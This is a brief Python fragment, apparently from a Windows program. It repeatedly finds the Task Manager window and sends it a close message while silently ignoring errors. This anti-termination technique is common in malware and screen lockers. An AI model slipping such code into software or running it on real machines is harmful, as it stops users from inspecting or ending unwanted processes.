_CLOSE_TM_LAST = 0.0

def _close_taskmgr():
    global _CLOSE_TM_LAST
    try:
        now = time.time()
        if now - _CLOSE_TM_LAST < 1.0:
            return
        if not _user32:
            return
        hwnd = _user32.FindWindowW("TaskManagerWindow", None)
        if hwnd:
            _user32.PostMessageW(hwnd, 0x0010, 0, 0)
            _CLOSE_TM_LAST = now
    except Exception:
        pass

